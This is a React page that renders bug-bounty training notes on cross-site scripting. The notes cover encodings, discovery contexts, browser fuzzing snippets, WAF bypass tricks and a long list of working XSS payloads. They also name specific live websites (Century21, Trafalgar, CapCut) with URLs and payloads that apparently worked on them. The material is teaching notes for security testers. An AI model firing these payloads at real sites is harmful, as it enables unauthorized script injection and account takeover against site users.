'use client';

import { motion } from 'framer-motion';
import TreeDocument from '@/components/TreeDocument';
import { Shield, ArrowLeft, BookOpen, Code, AlertTriangle, Zap } from 'lucide-react';
import Link from 'next/link';

// Narutow Live 4 - XSS Comprehensive Notes
const xssNotesTree = {
  label: 'Cross-Site Scripting (Narutow Live 4)',
  children: [
    {
      label: 'encodings',
      children: [
        {
          label: 'html encoding',
          children: [
            {
              label: 'character references',
              children: [
                { label: '&lt;' },
                { label: '&gt;' },
                { label: '&colon;' },
              ],
            },
            {
              label: 'unicode',
              children: [
                { label: 'encoding multilingual plain text' },
                { label: '\\UXXXX (HEX)' },
              ],
            },
          ],
        },
        {
          label: 'URL encoding',
          children: [
            { label: 'converts characters into another format' },
            { label: 'used in HTTP transmissions' },
            { label: '%HEX' },
            { label: "It doesn't work in JSON" },
          ],
        },
        {
          label: 'need to know',
          children: [
            { label: 'HTML attributes are decoded automatically' },
            { label: 'unicodes are decoded in JavaScript' },
          ],
        },
      ],
    },
    {
      label: 'discovery',
      children: [
        {
          label: 'outside a tag',
          children: [
            { label: 'script tag' },
            {
              label: '<x> tags + event handlers',
              children: [
                { label: '<img/src/onerror=alert(origin)>' },
                { label: '<details/open/ontoggle=alert(origin)>' },
                { label: '<voorivex onmouseover=alert(origin)>' },
              ],
            },
            {
              label: '<a> tag + javascript scheme',
              children: [
                { label: '<a href=javascript:alert(origin)>test</a>' },
                { label: '<a href="&#74;avascript&colon;alert(origin)">test</a>' },
              ],
            },
            { label: 'non-executable tags' },
          ],
        },
        {
          label: 'inside a tag',
          children: [
            { label: 'break the attribute and the tag' },
            { label: 'break the attribute + event handlers' },
            {
              label: 'dangerous attributes',
              children: [
                { label: 'href in <a> tag' },
                { label: 'src in <iframe> tag' },
              ],
            },
          ],
        },
        {
          label: 'JavaScript context',
          children: [
            { label: 'close </script> tag' },
            { label: 'break the context' },
          ],
        },
        {
          label: 'DOM XSS',
          children: [
            { label: 'look for the dangerous sinks' },
            {
              label: 'most common sinks',
              children: [
                { label: 'window.open' },
                { label: 'window.location' },
                { label: 'window.location.href' },
              ],
            },
            { label: 'there is no zero to hero tool' },
            { label: 'can be both stored or reflected' },
            { label: 'postMessage' },
          ],
        },
      ],
    },
    {
      label: 'fuzzing',
      children: [
        { label: 'Reference: Gareth Heyes - JavaScript for hackers' },
        {
          label: 'fuzzing for HTML tags',
          children: [
            { label: '<img[fuzz]src[fuzz]onerror=test>' },
            { label: '<svg onload=[fuzz]test>' },
          ],
        },
        {
          label: 'fuzzing for JavaScript scheme',
          children: [
            { label: 'javascript[fuzz]:' },
            { label: 'java[FUZZ]script[FUZZ]' },
            { label: 'javascript:' },
          ],
        },
      ],
    },
    {
      label: 'bypasses',
      children: [
        {
          label: 'known WAF?',
          children: [
            { label: 'yes → search on the Net!' },
            { label: 'no → CDN or application based?' },
            { label: 'no → try to build your own payload' },
          ],
        },
        { label: 'JS protection? debug!' },
        {
          label: 'extend your payload gently',
          children: [
            { label: '<x>' },
            { label: '<x onxxx>' },
            { label: '<x onxxx=' },
          ],
        },
        {
          label: 'do not use noisy strings in JS execution',
          children: [
            { label: 'alert, prompt, etc are filtered' },
            { label: "[][(\'cons\' + \'tructor\')][(\'cons\' + \'tructor\')](\'aler\' + \'t(origin)\')()" },
            { label: "location=location.hash.split(\'#\')[1] → #javascript:alert(origin)" },
          ],
        },
        {
          label: 'unicodes',
          children: [
            { label: '\\u{0061}' },
            { label: '\\u{000000000000061}' },
          ],
        },
        {
          label: 'parenthesis, brackets, func(), etc are filtered',
          children: [
            { label: 'alert?.(origin)' },
            { label: 'window.valueOf=alert;window+1' },
          ],
        },
        {
          label: 'in HTML tags',
          children: [
            { label: 'fuzz to find a valid HTML tag <ta[fuzz]g>' },
            {
              label: 'WAF confusion',
              children: [
                { label: '<img src="/" =_=" title="onerror=\'prompt(origin)\'">' },
                { label: '<--`<img/src=` onerror=alert(origin)> --!>' },
              ],
            },
            {
              label: 'use HTML encodings to circumvent the WAF',
              children: [
                { label: '<input type="&#x3e"/onfocus="alert(origin)"/autofocus>' },
                { label: '<img src=\\u003e onerror=alert(origin)>' },
              ],
            },
          ],
        },
      ],
    },
    {
      label: 'payloads',
      children: [
        { label: '<d3v/onmouseleave=[origin].some(confirm)>click' },
        { label: '<input type="&#x3e"/onfocus="alert(origin)"/autofocus>' },
        { label: '<img src=\\u003e onerror=alert(origin)>' },
        { label: '<details/open=/open/href=/data=; ontoggle="(alert)(document.domain)"' },
        { label: '<a href=&#01javascript:alert(origin)> → Wordfence 7.4.2' },
        { label: '<img%20sr%00c=x o%00nerror=((pro%00mpt(1)))> → @black0x00mamba | Bypass WAF Akamai' },
        { label: '</*</script+>ssss<%00x%20stc=<script>alert(origin);//+++</*</script+/x>*/' },
      ],
    },
    {
      label: 'post XSS',
      children: [
        {
          label: 'try to find account take-over',
          children: [
            { label: 'change password' },
            { label: 'account bind' },
          ],
        },
        { label: 'try to find PII information leakage' },
        {
          label: 'examples',
          children: [
            { label: 'https://x.com/YShahinzadeh/status/1531555591562399745' },
            { label: 'https://x.com/YShahinzadeh/status/1561384031836569600' },
          ],
        },
      ],
    },
    {
      label: 'review payloads',
      children: [
        { label: '<body onload="console.log(\'&#39;);&#x61;lert(origin);//">' },
        { label: '<img/src/onerror=\'console.log("&quot;);&#x61;lert(origin);//)\'>' },
        { label: '<img/src/onerror="\\u006llert(origin);">' },
        { label: '<iframe srcdoc="&lt;svg/onload=alert(origin)&gt;"></iframe>' },
        { label: '<a href="&#74;avascript&colon;alert(origin)">test</a>' },
        { label: '<a href=&#74;avascript&colon;alert(origin)>test</a>' },
        { label: '<a/href=javascript&colon;alert()>click' },
        { label: '<a href="j\\u006|vascript:\\u006llert(origin);">test</a>' },
      ],
    },
    {
      label: 'recap',
      children: [
        { label: 'if a reflected value is not present in the source code, it may have been built with DOM' },
        { label: 'enhance your payload gently step by step, do not use a noisy payload at beginning' },
        { label: 'changes after a rule set (checker function or waf) is a killer' },
        { label: 'we can use unicode in our JavaScript codes' },
        { label: 'html encoding and character references are automatically decoded in HTML attributes' },
        { label: 'dangerous sinks are not vulnerable unless they accept input from users' },
        { label: 'setup your own test-bed to evaluate new XSS payloads' },
        { label: 'increase the severity of your XSS as much as possible, even to high' },
        { label: 'fuzzing is your friend during your hunting, do not drop it' },
        { label: 'almost in every case, when you can execute JS, the XSS is guaranteed' },
        { label: 'debugging JavaScript codes do not give us only XSS, but other bug types as well' },
        { label: 'XSS is not related to Content-Type, always check for it' },
        { label: 'tools do not make hackers, hackers make tools' },
      ],
    },
  ],
};


// Student TODOs
const studentTodos = [
  'Learn gRPC like our session (including setup)',
  'Learn React like our session (including setup)',
  'XSS overview + WAF bypass',
  'Narrow recon overview (work on capcut.com)',
  'Understanding the payload: <a href="&#74;avascript&colon;\\u0061lert(origin)">test</a>',
  'Fuzz to discover characters here: <img src onerror=[FUZZ]alert(origin)>',
];

// Real-world examples from the session
const realWorldExamples = [
  {
    title: 'Century21 Property Search',
    url: 'https://ssl.century21.com/property-search?location=voorivex',
    payloads: [
      'voorivex"><img src onerror=alert(origin)>',
      'asdasd" autofocus+onfocus%3Dconfirm(origin) "',
    ],
  },
  {
    title: 'Trafalgar Payday',
    url: 'https://payday.trafalgar.co.za/payday/cgi-bin/claims.cgi',
    payloads: [
      'voorivex</script>vmamad<svg onload=alert(origin)>',
      'voorivex</script>mamad<img src=x onerror=alert(origin)>',
    ],
  },
  {
    title: 'CapCut Token Auth',
    url: 'https://www.capcut.com/tokenAuth',
    payloads: [
      'redirect_url=javascript%0A:alert(origin)',
      'redirect_url=%01avascript:alert(origin)',
    ],
  },
];

// Fuzzing code snippets
const fuzzingSnippets = [
  {
    title: 'JavaScript Scheme Fuzzer',
    code: `log = [];
let anchor = document.createElement('a');
for (let i = 0; i <= 0x10ffff; i++) {
  anchor.href = \`javascript\${String.fromCodePoint(i)}:\`;
  if (anchor.protocol === 'javascript:') {
    log.push(i);
  }
}
// Result: Array(4) [ 9, 10, 13, 58 ]
// Characters: "\\t", "\\n", "\\r", ":"`,
  },
  {
    title: 'HTML Tag Attribute Fuzzer',
    code: `const div = document.createElement('div');
const result = [];
const worked = p => result.push(p);
for (let i = 0; i < 0x10ff; ++i) {
  div.innerHTML = \`<img\${String.fromCodePoint(i)}src=x\${String.fromCodePoint(i)}onerror=worked(\${i})>\`;
}
document.body.appendChild(div);
// Result: Array(6) [ "\\t", "\\n", "\\u000c", "\\r", " ", "/" ]`,
  },
];

export default function XSSNarutowLive4Page() {
  return (
    <div className="space-y-6">
      {/* Header */}
      <motion.div
        initial={{ opacity: 0, y: -20 }}
        animate={{ opacity: 1, y: 0 }}
        className="flex items-center justify-between"
      >
        <div className="flex items-center gap-4">
          <Link
            href="/dashboard"
            className="p-2 hover:bg-dark-800 rounded-lg transition-colors"
          >
            <ArrowLeft className="w-5 h-5 text-slate-400 hover:text-white" />
          </Link>
          <div>
            <h1 className="text-2xl font-bold text-white flex items-center gap-3">
              <Shield className="w-6 h-6 text-primary-400" />
              XSS Notes - Narutow Live 4
            </h1>
            <p className="text-slate-400 mt-1">Comprehensive Cross-Site Scripting reference from Narutow Live 4 session</p>
          </div>
        </div>
        <span className="px-3 py-1 bg-primary-500/20 text-primary-400 rounded-full text-sm font-medium">
          Narutow Live 4
        </span>
      </motion.div>

      {/* Student TODOs */}
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ delay: 0.05 }}
        className="bg-dark-900/80 backdrop-blur rounded-xl border border-yellow-500/30 p-6"
      >
        <h2 className="text-lg font-semibold text-white mb-4 flex items-center gap-2">
          <BookOpen className="w-5 h-5 text-yellow-400" />
          Student TODOs
        </h2>
        <ul className="space-y-2">
          {studentTodos.map((todo, index) => (
            <li key={index} className="flex items-start gap-3 text-slate-300 text-sm">
              <input type="checkbox" className="mt-1 accent-primary-400" />
              <span className="font-mono">{todo}</span>
            </li>
          ))}
        </ul>
      </motion.div>

      {/* Tree Document */}
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ delay: 0.1 }}
      >
        <TreeDocument data={xssNotesTree} />
      </motion.div>

      {/* Key Concepts */}
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ delay: 0.15 }}
        className="bg-dark-900/80 backdrop-blur rounded-xl border border-dark-800 p-6"
      >
        <h2 className="text-lg font-semibold text-white mb-4 flex items-center gap-2">
          <Zap className="w-5 h-5 text-primary-400" />
          Key Concepts
        </h2>
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          <div className="p-4 bg-dark-800/50 rounded-lg border border-dark-700">
            <h3 className="text-sm font-semibold text-primary-400 mb-2">Severity Levels</h3>
            <ul className="space-y-1 text-slate-300 text-sm">
              <li>• XSS low, high (60k)</li>
              <li>• ATO high</li>
              <li>• rXSS on tiktok → $2500</li>
              <li>• rXSS on tiktok + ATO → $5000</li>
            </ul>
          </div>
          <div className="p-4 bg-dark-800/50 rounded-lg border border-dark-700">
            <h3 className="text-sm font-semibold text-primary-400 mb-2">Content Types</h3>
            <ul className="space-y-1 text-slate-300 text-sm">
              <li>• application/x-www-form-urlencoded</li>
              <li>• multipart/form-data</li>
              <li>• application/json</li>
            </ul>
          </div>
          <div className="p-4 bg-dark-800/50 rounded-lg border border-dark-700">
            <h3 className="text-sm font-semibold text-primary-400 mb-2">DOM vs Reflected XSS</h3>
            <ul className="space-y-1 text-slate-300 text-sm">
              <li>• innerTEXT vs innerHTML</li>
              <li>• Sink → innerTEXT (NO)</li>
              <li>• Sink → innerHTML (YES)</li>
            </ul>
          </div>
          <div className="p-4 bg-dark-800/50 rounded-lg border border-dark-700">
            <h3 className="text-sm font-semibold text-primary-400 mb-2">Encoding Transformations</h3>
            <ul className="space-y-1 text-slate-300 text-sm font-mono">
              <li>• a → &amp;#x61 → %26%23x61</li>
              <li>• alert(origin) → \u0061lert(origin)</li>
              <li>• yashar === y\u0061shar</li>
            </ul>
          </div>
        </div>
      </motion.div>

      {/* Real World Examples */}
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ delay: 0.2 }}
        className="bg-dark-900/80 backdrop-blur rounded-xl border border-dark-800 p-6"
      >
        <h2 className="text-lg font-semibold text-white mb-4 flex items-center gap-2">
          <AlertTriangle className="w-5 h-5 text-orange-400" />
          Real World Examples (Educational)
        </h2>
        <div className="space-y-4">
          {realWorldExamples.map((example, index) => (
            <div key={index} className="p-4 bg-dark-800/50 rounded-lg border border-dark-700">
              <h3 className="text-sm font-semibold text-primary-400 mb-2">{example.title}</h3>
              <p className="text-xs text-slate-500 mb-2 font-mono break-all">{example.url}</p>
              <div className="space-y-1">
                {example.payloads.map((payload, pIndex) => (
                  <code key={pIndex} className="block text-xs text-slate-300 bg-dark-900 p-2 rounded font-mono break-all">
                    {payload}
                  </code>
                ))}
              </div>
            </div>
          ))}
        </div>
      </motion.div>

      {/* Fuzzing Code Snippets */}
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ delay: 0.25 }}
        className="bg-dark-900/80 backdrop-blur rounded-xl border border-dark-800 p-6"
      >
        <h2 className="text-lg font-semibold text-white mb-4 flex items-center gap-2">
          <Code className="w-5 h-5 text-green-400" />
          Fuzzing Code Snippets
        </h2>
        <div className="space-y-4">
          {fuzzingSnippets.map((snippet, index) => (
            <div key={index} className="p-4 bg-dark-800/50 rounded-lg border border-dark-700">
              <h3 className="text-sm font-semibold text-primary-400 mb-2">{snippet.title}</h3>
              <pre className="text-xs text-slate-300 bg-dark-900 p-3 rounded font-mono overflow-x-auto">
                {snippet.code}
              </pre>
            </div>
          ))}
        </div>
      </motion.div>

      {/* WAF Bypass Notes */}
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ delay: 0.3 }}
        className="bg-dark-900/80 backdrop-blur rounded-xl border border-red-500/30 p-6"
      >
        <h2 className="text-lg font-semibold text-white mb-4 flex items-center gap-2">
          <Shield className="w-5 h-5 text-red-400" />
          WAF Bypass Techniques
        </h2>
        <div className="space-y-3 text-slate-300 text-sm">
          <div className="p-4 bg-dark-800/50 rounded-lg border border-dark-700">
            <p className="text-xs text-slate-400 mb-2 font-semibold uppercase tracking-wide">Cloudflare WAF Bypass:</p>
            <ul className="space-y-1 font-mono text-xs">
              <li>• &lt;X&gt;, &lt;X ONXXX&gt;, &lt;X ONXXX=&gt;, &lt;a ONXXX=&gt;, &lt;a onerror=&gt;</li>
              <li>• &lt;img&gt;&lt;iframe&gt;&lt;iframe&gt;</li>
              <li>• &lt;details/open/ontoggle=alert(origin)&gt;</li>
            </ul>
          </div>
          <div className="p-4 bg-dark-800/50 rounded-lg border border-dark-700">
            <p className="text-xs text-slate-400 mb-2 font-semibold uppercase tracking-wide">Application WAF - JS Protection:</p>
            <ul className="space-y-1 font-mono text-xs">
              <li>• \u0061lert(origin)</li>
              <li>• \u&#123;0061&#125;lert(origin)</li>
              <li>• \u&#123;000000000000061&#125;lert(origin)</li>
              <li>• alert?.(origin)</li>
              <li>• window.valueOf=alert;window+1</li>
            </ul>
          </div>
          <div className="mt-4 p-4 bg-red-900/20 rounded-lg border border-red-500/30">
            <p className="text-red-400 font-semibold text-sm">⚠️ Critical Insight:</p>
            <p className="text-slate-300 mt-1">replacement after ruleset is a killer for WAF and checker_function</p>
            <ul className="mt-2 space-y-1 text-xs">
              <li className="text-green-400">✓ Safe: 1. replacement 2. ruleset</li>
              <li className="text-red-400">✗ Bug: 1. ruleset 2. replacement</li>
            </ul>
          </div>
        </div>
      </motion.div>

      {/* Resources */}
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ delay: 0.35 }}
        className="bg-dark-900/80 backdrop-blur rounded-xl border border-dark-800 p-6"
      >
        <h2 className="text-lg font-semibold text-white mb-4 flex items-center gap-2">
          <BookOpen className="w-5 h-5 text-blue-400" />
          Resources
        </h2>
        <ul className="space-y-2 text-slate-300 text-sm">
          <li className="flex items-start gap-2">
            <span className="text-primary-400">•</span>
            <span>Gareth Heyes - JavaScript for hackers - Learn to think like a hacker (2022)</span>
          </li>
          <li className="flex items-start gap-2">
            <span className="text-primary-400">•</span>
            <a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" className="text-blue-400 hover:underline">PortSwigger XSS Cheat Sheet</a>
          </li>
          <li className="flex items-start gap-2">
            <span className="text-primary-400">•</span>
            <a href="https://blog.isec.pl/waf-evasion-techniques" className="text-blue-400 hover:underline">WAF Evasion Techniques - isec.pl</a>
          </li>
          <li className="flex items-start gap-2">
            <span className="text-primary-400">•</span>
            <a href="https://labs.cognisys.group/posts/An-Interesting-XSS-Bypassing-WAF" className="text-blue-400 hover:underline">An Interesting XSS Bypassing WAF - Cognisys</a>
          </li>
        </ul>
      </motion.div>
    </div>
  );
}
